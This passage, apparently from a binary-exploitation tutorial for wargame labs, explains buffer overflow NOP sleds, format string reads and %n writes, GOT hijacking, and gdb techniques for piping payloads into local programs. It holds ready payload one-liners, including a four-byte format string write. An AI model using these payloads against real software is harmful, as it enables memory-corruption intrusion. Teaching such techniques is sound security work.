<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;</span><span class="se">\x90</span><span class="s1">&quot;*50 + &quot;30 Bytes of ShellCode&quot; + &quot;4 Bytes return address to NOP or shellcode in left&quot;&#39;</span>
</pre></div>
</div>
<p>However, if somekind of check for alphanumeric characters is present for first 80 bytes you won’t be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;A&quot;*80 + &quot;4 Bytes return address to NOP or shellcode in right&quot; + &quot;</span><span class="se">\x90</span><span class="s1">&quot;*50 + &quot;30 Bytes of ShellCode&quot;&#39;</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
</section>
<section id="format-string-vulnerability">
<h2>Format String Vulnerability<a class="headerlink" href="#format-string-vulnerability" title="Link to this heading"></a></h2>
<section id="definition">
<h3>Definition<a class="headerlink" href="#definition" title="Link to this heading"></a></h3>
<p>If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters. Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;The magic number is: </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mi">1911</span><span class="p">);</span>
</pre></div>
</div>
</section>
<section id="behaviour-of-the-format-function">
<h3>Behaviour of the format function<a class="headerlink" href="#behaviour-of-the-format-function" title="Link to this heading"></a></h3>
<p>The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;Number </span><span class="si">%d</span><span class="s2"> has no address, number </span><span class="si">%d</span><span class="s2"> has: </span><span class="si">%08x</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
</pre></div>
</div>
<p>From within the printf function the stack looks like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">stack</span> <span class="n">top</span>
<span class="o">.</span> <span class="o">.</span> <span class="o">.</span>
<span class="o">&lt;&amp;</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">i</span><span class="o">&gt;</span>
 <span class="n">A</span>
<span class="o">.</span> <span class="o">.</span> <span class="o">.</span>
<span class="n">stack</span> <span class="n">bottom</span>
</pre></div>
</div>
</section>
<section id="crashing-the-program">
<h3>Crashing the Program<a class="headerlink" href="#crashing-the-program" title="Link to this heading"></a></h3>
<p>By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;</span><span class="si">%s%s%s%s%s%s%s%s%s%s%s%s</span><span class="s2">&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</p>
</section>
<section id="viewing-the-stack">
<h3>Viewing the stack<a class="headerlink" href="#viewing-the-stack" title="Link to this heading"></a></h3>
<p>How some parts of the stack memory by using a format string like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">40012980.080628</span><span class="n">c4</span><span class="o">.</span><span class="n">bffff7a4</span><span class="mf">.00000005.08059</span><span class="n">c04</span>
</pre></div>
</div>
<p>This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.</p>
</section>
<section id="viewing-memory-at-any-location">
<h3>Viewing Memory at any location<a class="headerlink" href="#viewing-memory-at-any-location" title="Link to this heading"></a></h3>
<p>We can look at memory locations different from the stack memory by providing an address to the format string.</p>
<p>Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;AAA0AAA1_</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string. In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one. Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x08480110</span>
<span class="n">address</span> <span class="p">(</span><span class="n">encoded</span> <span class="k">as</span> <span class="mi">32</span> <span class="n">bit</span> <span class="n">le</span> <span class="n">string</span><span class="p">):</span> <span class="s2">&quot;</span><span class="se">\x10\x01\x48\x08</span><span class="s2">&quot;</span>
<span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x10\x01\x48\x08</span><span class="s2">_</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">|</span><span class="si">%s</span><span class="s2">|&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.</p>
</section>
<section id="overwriting-of-arbitrary-memory">
<h3>Overwriting of Arbitrary Memory<a class="headerlink" href="#overwriting-of-arbitrary-memory" title="Link to this heading"></a></h3>
<p>There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) at the address:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;</span><span class="se">\xc0\xc8\xff\xbf</span><span class="s2">_</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.%n&quot;</span>
</pre></div>
</div>
<p>The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit.</p>
<section id="direct-parameter-access">
<h4>Direct Parameter Access<a class="headerlink" href="#direct-parameter-access" title="Link to this heading"></a></h4>
<p>The direct parameter access is controlled by the ‘$’ qualifier</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;%6`\ d:raw-latex:`</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</pre></div>
</div>
<p>Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.</p>
<p>The above text is taken from and a good paper to read for format string is <a class="reference external" href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/files/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></p>
<blockquote>
<div></div></blockquote>
</section>
<section id="write-two-bytes">
<h4>Write two bytes<a class="headerlink" href="#write-two-bytes" title="Link to this heading"></a></h4>
<p>We can write two bytes by %hn and one byte by %hhn.</p>
</section>
<section id="write-four-bytes">
<h4>Write four bytes<a class="headerlink" href="#write-four-bytes" title="Link to this heading"></a></h4>
<p>How to write four bytes? Suppose we need to write 0x8048706 to the address 0xffffd64c.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>HOB:0x0804 LOB:0x8706

If HOB &lt; LOB

[addr+2][addr] = \x4e\xd\xff\xff\x4c\xd\xff\xff
%.[HOB - 8]x = 0x804 - 8 = 7FC (2044) = %.2044x
%[offset]$hn = %6\$hn
%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
%[offset+1]`\ hn = %7$hn

python -c &#39;print &quot;\x4e\xd6\xff\xff\x4c\xd6\xff\xff&quot; +&quot;%.2044x%6\$hn %.32514x%7\$hn&quot;&#39;
</pre></div>
</div>
</section>
</section>
</section>
<section id="heap-exploitation">
<h2>Heap Exploitation<a class="headerlink" href="#heap-exploitation" title="Link to this heading"></a></h2>
</section>
<section id="shared-library">
<h2>Shared Library<a class="headerlink" href="#shared-library" title="Link to this heading"></a></h2>
<p>A library whose code segment can be shared among multiple processes and whose data segment is unique to each process is called a Shared Library, thereby saving huge amount of RAM and disk space.
Shared library is also referred using other names like dynamic library, shared object files, DSO and DLL(Windows).</p>
<section id="hijack-the-global-offset-table-with-pointers">
<h3>Hijack the Global Offset Table with pointers<a class="headerlink" href="#hijack-the-global-offset-table-with-pointers" title="Link to this heading"></a></h3>
<section id="id1">
<h4>Definition<a class="headerlink" href="#id1" title="Link to this heading"></a></h4>
<p>The Global Offset Table redirects position independent address calculations to an absolute location and is located in the .got section of an ELF executable or shared object. It stores the final (absolute) location of a function calls symbol, used in dynamically linked code. When a program requests to use printf() for instance, after the rtld locates the symbol, the location is then relocated in the GOT and allows for the executable via the Procedure Linkage Table, to directly access the symbols location.</p>
<p>When you disassemble main and printf statement is present, you will get like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mh">0x080484b9</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span> <span class="mh">0x8048330</span> <span class="n">printf</span><span class="nd">@plt</span> <span class="o">&lt;----</span><span class="n">PLT</span>
</pre></div>
</div>
<p>if you further disassemble printf</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ pdisass printf
Dump of assembler code for function printf@plt:
    0x08048330 &lt;+0&gt;: jmp DWORD PTR ds:0x8049788 &lt;----GOT Address
    0x08048336 &lt;+6&gt;: push 0x0
    0x0804833b &lt;+11&gt;: jmp 0x8048320 End of assembler dump.
</pre></div>
</div>
<p>Further disassembling the address 0x8049788</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ pdisass 0x8049788
Dump of assembler code from 0x8049788 to 0x80497a8:
  0x08049788 &lt;printf@got.plt+0&gt;:   add    DWORD PTR ss:[eax+ecx*1],0x46
  0x0804978d &lt;fgets@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x56
  0x08049791 &lt;puts@got.plt+1&gt;: add    DWORD PTR [eax+ecx*1],0x66
  0x08049795 &lt;__gmon_start__@got.plt+1&gt;:   add    DWORD PTR [eax+ecx*1],0x76
  0x08049799 &lt;__libc_start_main@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x0
  0x0804979d &lt;data_start+1&gt;:   add    BYTE PTR [eax],al
  0x0804979f &lt;data_start+3&gt;:   add    BYTE PTR [eax],al
  0x080497a1 &lt;__dso_handle+1&gt;: add    BYTE PTR [eax],al
  0x080497a3 &lt;__dso_handle+3&gt;: add    BYTE PTR [eax],al
  0x080497a5 &lt;stdin@@GLIBC_2.0+1&gt;: add    BYTE PTR [eax],al
  0x080497a7 &lt;stdin@@GLIBC_2.0+3&gt;: add    BYTE PTR [eax],al
End of assembler dump.
</pre></div>
</div>
<p>Objdump reflects the same (notice the +1) GOT address:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objdump</span> <span class="o">--</span><span class="n">dynamic</span><span class="o">-</span><span class="n">reloc</span> <span class="o">./</span><span class="n">behemoth3</span>

<span class="o">./</span><span class="n">behemoth3</span><span class="p">:</span>     <span class="n">file</span> <span class="nb">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">DYNAMIC</span> <span class="n">RELOCATION</span> <span class="n">RECORDS</span>
<span class="n">OFFSET</span>   <span class="n">TYPE</span>              <span class="n">VALUE</span>
<span class="mi">08049778</span> <span class="n">R_386_GLOB_DAT</span>    <span class="n">__gmon_start__</span>
<span class="mi">080497</span><span class="n">a4</span> <span class="n">R_386_COPY</span>        <span class="n">stdin</span>
<span class="mi">08049788</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">printf</span>
<span class="mi">0804978</span><span class="n">c</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">fgets</span>
<span class="mi">08049790</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">puts</span>
<span class="mi">08049794</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__gmon_start__</span>
<span class="mi">08049798</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__libc_start_main</span>
</pre></div>
</div>
<p>Quick diagram what it looks like:</p>
<p>So a quick diagram of what happens looks kind’a like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">printf</span><span class="p">()]</span> <span class="o">&lt;--------------------------------</span>
   <span class="o">|</span>                                       <span class="o">|</span>
   <span class="o">--------------&gt;</span> <span class="p">[</span><span class="n">PLT</span><span class="p">]</span><span class="o">---&gt;</span><span class="p">[</span><span class="n">d_r_resolve</span><span class="p">]</span><span class="o">--|</span>
                     <span class="o">|</span>           <span class="o">|</span>         <span class="o">|</span>
                     <span class="o">--------------------&gt;</span><span class="p">[</span><span class="n">GOT</span><span class="p">]</span><span class="o">&lt;--</span>
                                 <span class="o">|</span>               <span class="o">|</span>
                                  <span class="o">-------&gt;</span><span class="p">[</span><span class="n">libc</span><span class="p">]</span><span class="o">--</span>
</pre></div>
</div>
<p>A good paper to read about and from where the definition and diagram is taken is <a class="reference external" href="https://www.exploit-db.com/raw/13203/">How to Hijack the Global Offset Table with pointers</a></p>
</section>
</section>
<section id="tips-and-tricks">
<h3>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>Probably, sometimes, we have to use <a class="reference external" href="https://www.exploit-db.com/exploits/34060/">Socket re-use shellcode</a></p></li>
<li><p>To attach to a network process in gdb, you might have to use</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ set follow-fork-mode child
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>If the parent is killed, children become children of the init process (that has the process id 1 and is launched as the first user process by the kernel). The init process checks periodically for new children, and kills them if they have exited (thus freeing resources that are allocated by their return value).</p></li>
</ul>
</section>
</section>
<section id="appendix">
<h2>Appendix<a class="headerlink" href="#appendix" title="Link to this heading"></a></h2>
<section id="gdb-basics">
<h3>GDB Basics<a class="headerlink" href="#gdb-basics" title="Link to this heading"></a></h3>
<section id="getting-inputs">
<h4>Getting inputs<a class="headerlink" href="#getting-inputs" title="Link to this heading"></a></h4>
<p>Taken from <a class="reference external" href="https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection">Managing inputs for payload injection?</a></p>
<section id="getting-inputs-from-char-argv">
<h5>Getting inputs from char *argv[]<a class="headerlink" href="#getting-inputs-from-char-argv" title="Link to this heading"></a></h5>
<p>We can read the arguments from the initial command line</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; ./program $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
<p>In gdb, we can pass the arguments through the run command line:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) run $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
</section>
<section id="getting-inputs-from-a-file">
<h5>Getting inputs from a file<a class="headerlink" href="#getting-inputs-from-a-file" title="Link to this heading"></a></h5>
<p>We can also provide input from file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; ./program ./myfile.txt
</pre></div>
</div>
<p>And, within gdb</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span> <span class="n">myfile</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>Then, outside of gdb you can rewrite the content of the file and run your program again and again in gdb.</p>
</section>
<section id="getting-inputs-from-stdin">
<h5>Getting inputs from stdin<a class="headerlink" href="#getting-inputs-from-stdin" title="Link to this heading"></a></h5>
<p>Getting the input through stdin can be achieve through a wide variety of functions such as fgets(), scanf(), getline(), read() and others. It raises a few problems because the program stop while executing and wait to be fed with characters.</p>
<p>In case you have to deal with several inputs (eg login, password, …), you need to use separators between the inputs. Usually the separator between each input is just a newline character (n or r depending on the system you are in).</p>
<p>Now, you have two ways of doing to feed the stdin. Either we pass the file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; cat ./mycommands.txt | ./program
</pre></div>
</div>
<p>The stdin requires to run the command either through a file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span> <span class="o">&lt;</span> <span class="o">./</span><span class="n">mycommands</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>And do as said in the previous case.</p>
<p>The other option is to pipe the output of a command to the stdin of the program</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39; | ./program
</pre></div>
</div>
<p>In gdb we can use the bash process substitution &lt;(cmd) trick:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print(&quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&quot;)&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>This way is much quicker than effectively creating a named pipe and branch your program on it. Creating the named pipe outside of gdb requires a lot of unnecessary steps where you have it instantly with the previous technique.</p>
<p>Note also that, some people are using &lt;&lt;$(cmd) like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) run &lt;&lt;&lt; $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
<p>But, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).</p>
</section>
<section id="getting-inputs-from-network">
<h5>Getting inputs from network<a class="headerlink" href="#getting-inputs-from-network" title="Link to this heading"></a></h5>
<p>We can use netcat nc. Basically, if your vulnerable program is listening on localhost:666 then the command line would be:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39; | nc -vv localhost 666
</pre></div>
</div>
<p>Within gdb, the point will be to run (r) the program and to connect to it from another terminal.</p>
</section>
<section id="keep-the-stdin-open-after-injection">
<h5>Keep the stdin open after injection<a class="headerlink" href="#keep-the-stdin-open-after-injection" title="Link to this heading"></a></h5>
<p>Most of the techniques for stdin will send the exploit string to the program which will end shortly after the termination of the input. This mainly happens in gets buffer overflow, so, the stdin should be closed and reopened. The best way to keep it open afterward and get an active shell is to add a cat waiting for input on its stdin. It should look like this if you go though a file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; (cat ./mycommands.txt; cat) | ./program
</pre></div>
</div>
<p>Or, if you want a shell command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; (python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;; cat) | ./program
</pre></div>
</div>
<p>Or, finally, if you are going through the network:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$&gt; (python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;; cat) | nc -vv localhost 666
</pre></div>
</div>
</section>
</section>
<section id="examining-data">
<h4>Examining Data<a class="headerlink" href="#examining-data" title="Link to this heading"></a></h4>
<section id="examining-functions">
<h5>Examining functions<a class="headerlink" href="#examining-functions" title="Link to this heading"></a></h5>
<p>info functions command : Dislays the list of functions in the debugged program</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00000000000005a0  _init
0x00000000000005d0  setresgid@plt
0x00000000000005e0  system@plt
0x00000000000005f0  printf@plt
0x0000000000000600  getegid@plt
0x0000000000000620  _start
0x0000000000000650  deregister_tm_clones
0x0000000000000690  register_tm_clones
0x00000000000006e0  __do_global_dtors_aux
0x0000000000000720  frame_dummy
0x000000000000072a  vuln
0x0000000000000765  main
0x00000000000007c0  __libc_csu_init
0x0000000000000830  __libc_csu_fini
0x0000000000000834  _fini
</pre></div>
</div>
<p>Run it before running the program, otherwise all linked functions would also be shown.</p>
<p><strong>Disassembling Functions</strong></p>
<p>GDB</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">disassemble</span> <span class="n">main</span>
</pre></div>
</div>
<p>GDB-Peda</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pdisass</span> <span class="n">main</span>
</pre></div>
</div>
</section>
<section id="examining-memory">
<h5>Examining Memory<a class="headerlink" href="#examining-memory" title="Link to this heading"></a></h5>
<p>We can use the command x (for “examine”) to examine memory in any of several formats, independently of your program’s data types.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">x</span><span class="o">/</span><span class="n">nfu</span> <span class="n">addr</span>
<span class="n">x</span> <span class="n">addr</span>
<span class="n">x</span>
</pre></div>
</div>
<p>Use the x command to examine memory.</p>
<p>n, f, and u are all optional parameters that specify how much memory to display and how to format it; addr is an expression giving the address where you want to start displaying memory.</p>
<ul class="simple">
<li><p>n, the repeat count : The repeat count is a decimal integer; the default is 1. It specifies how much memory (counting by units u) to display.</p></li>
<li><p>f, the display format : The display format is one of the formats used by print, ‘s’ (null-terminated string), or ‘i’ (machine instruction). The default is ‘x’ (hexadecimal) initially. The default changes each time you use either x or print.</p></li>
<li><p>u, the unit size : The unit size is any of</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>b Bytes.</p></li>
<li><p>h Halfwords (two bytes).</p></li>
<li><p>w Words (four bytes). This is the initial default.</p></li>
<li><p>g Giant words (eight bytes).</p></li>
</ul>
</div></blockquote>
</section>
<section id="id2">
<h5>Examining Data<a class="headerlink" href="#id2" title="Link to this heading"></a></h5>
<p>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">gdb</span> <span class="o">&lt;</span><span class="n">program</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;&lt;</span><span class="n">variablename</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>We can also use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">address</span> <span class="n">variable_name</span>
<span class="n">Symbol</span> <span class="s2">&quot;variable_name&quot;</span> <span class="ow">is</span> <span class="n">static</span> <span class="n">storage</span> <span class="n">at</span> <span class="mh">0x903278</span><span class="o">.</span>
</pre></div>
</div>
<p>Find the address of a string using GDB?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="nb">map</span>
<span class="n">process</span> <span class="mi">930</span>
<span class="n">Mapped</span> <span class="n">address</span> <span class="n">spaces</span><span class="p">:</span>

   <span class="n">Start</span> <span class="n">Addr</span>           <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
     <span class="mh">0x400000</span>           <span class="mh">0x401000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">myapp</span>
     <span class="mh">0x600000</span>           <span class="mh">0x601000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">myapp</span>
     <span class="mh">0x601000</span>           <span class="mh">0x602000</span>     <span class="mh">0x1000</span>     <span class="mh">0x1000</span> <span class="o">/</span><span class="n">myapp</span>
 <span class="mh">0x7ffff7a1c000</span>     <span class="mh">0x7ffff7bd2000</span>   <span class="mh">0x1b6000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.17</span><span class="o">.</span><span class="n">so</span>
 <span class="mh">0x7ffff7bd2000</span>     <span class="mh">0x7ffff7dd2000</span>   <span class="mh">0x200000</span>   <span class="mh">0x1b6000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.17</span><span class="o">.</span><span class="n">so</span>
 <span class="mh">0x7ffff7dd2000</span>     <span class="mh">0x7ffff7dd6000</span>     <span class="mh">0x4000</span>   <span class="mh">0x1b6000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.17</span><span class="o">.</span><span class="n">so</span>
 <span class="mh">0x7ffff7dd6000</span>     <span class="mh">0x7ffff7dd8000</span>     <span class="mh">0x2000</span>   <span class="mh">0x1ba000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.17</span><span class="o">.</span><span class="n">so</span>

 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">find</span> <span class="mh">0x7ffff7a1c000</span><span class="p">,</span><span class="mh">0x7ffff7bd2000</span><span class="p">,</span><span class="s2">&quot;/bin/sh&quot;</span>
 <span class="mh">0x7ffff7b98489</span>
 <span class="mi">1</span> <span class="n">pattern</span> <span class="n">found</span><span class="o">.</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="o">/</span><span class="n">s</span> <span class="mh">0x7ffff7b98489</span>
 <span class="mh">0x7ffff7b98489</span><span class="p">:</span> <span class="s2">&quot;/bin/sh&quot;</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="o">/</span><span class="n">xg</span> <span class="mh">0x7ffff7b98489</span>
 <span class="mh">0x7ffff7b98489</span><span class="p">:</span> <span class="mh">0x0068732f6e69622f</span>
</pre></div>
</div>
</section>
<section id="examining-frames">
<h5>Examining Frames<a class="headerlink" href="#examining-frames" title="Link to this heading"></a></h5>
<p>Here we would interpret GDB “info frame” output?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">frame</span>
<span class="n">Stack</span> <span class="n">level</span> <span class="mi">0</span><span class="p">,</span> <span class="n">frame</span> <span class="n">at</span> <span class="mh">0xb75f7390</span><span class="p">:</span>
<span class="n">eip</span> <span class="o">=</span> <span class="mh">0x804877f</span> <span class="ow">in</span> <span class="n">base</span><span class="p">::</span><span class="n">func</span><span class="p">()</span> <span class="p">(</span><span class="n">testing</span><span class="o">.</span><span class="n">cpp</span><span class="p">:</span><span class="mi">16</span><span class="p">);</span> <span class="n">saved</span> <span class="n">eip</span> <span class="mh">0x804869a</span>
<span class="n">called</span> <span class="n">by</span> <span class="n">frame</span> <span class="n">at</span> <span class="mh">0xb75f73b0</span>
<span class="n">source</span> <span class="n">language</span> <span class="n">c</span><span class="o">++.</span>
<span class="n">Arglist</span> <span class="n">at</span> <span class="mh">0xb75f7388</span><span class="p">,</span> <span class="n">args</span><span class="p">:</span> <span class="n">this</span><span class="o">=</span><span class="mh">0x0</span>
<span class="n">Locals</span> <span class="n">at</span> <span class="mh">0xb75f7388</span><span class="p">,</span> <span class="n">Previous</span> <span class="n">frame</span><span class="s1">&#39;s sp is 0xb75f7390</span>
<span class="n">Saved</span> <span class="n">registers</span><span class="p">:</span>
